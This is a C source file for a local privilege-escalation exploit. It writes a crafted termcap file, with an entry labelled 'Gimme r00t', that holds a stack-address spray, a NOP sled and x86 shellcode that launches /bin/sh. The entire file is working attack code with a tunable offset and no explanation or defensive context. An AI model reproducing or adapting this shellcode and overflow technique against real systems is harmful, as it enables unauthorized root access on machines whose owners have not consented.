#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

#define filename "./termcap"
#define entry   "access|Gimme r00t:\\\n :"
#define bufsize 1300
#define default_offset 870    /* Should work...*/

char shellcode[] =
   "\xeb\x35\x5e\x59\x33\xc0\x89\x46\xf5\x83\xc8\x07\x66\x89\x46\xf9"
   "\x8d\x1e\x89\x5e\x0b\x33\xd2\x52\x89\x56\x07\x89\x56\x0f\x8d\x46"
   "\x0b\x50\x8d\x06\x50\xb8\x7b\x56\x34\x12\x35\x40\x56\x34\x12\x51"
   "\x9a\x3e\x39\x29\x28\x39\x3c\xe8\xc6\xff\xff\xff/bin/sh";

long get_sp(void)
{
   __asm__("movl %esp, %eax\n");
}

int main(int argc, char *argv[]) {
   int i, fd, offs;
   long *bof_ptr;
   char *ptr, *buffer, *tempbuf;

   offs = default_offset;

   if(argc == 2) {
      printf("using offset: %d\n",atoi(argv[1]));
      offs = atoi(argv[1]);
   }

   if(!(buffer = malloc(bufsize))) {
      printf("can't allocate enough memory\n");
      exit(0);
   }


  if(!(tempbuf = malloc(bufsize+strlen(entry) + 50))) {
      printf("can't allocate enough memory\n");
      exit(0);
   }

   bof_ptr = (long *)buffer;
   for (i = 0; i < bufsize - 4; i += 4)
      *(bof_ptr++) = get_sp() - offs;

   ptr = (char *)buffer;
   for (i = 0; i < ((bufsize-strlen(shellcode)))/2 - 1; i++)
      *(ptr++) = 0x90;

   for (i = 0; i < strlen(shellcode); i++)
      *(ptr++) = shellcode[i];

   printf("Creating termcap file\n");

   snprintf(tempbuf, (bufsize+strlen(entry)+50), "%s%s:\n", entry,
buffer);
   fd = open(filename, O_WRONLY|O_CREAT, 0666);
   write (fd, tempbuf, strlen(tempbuf));
   close(fd);
}

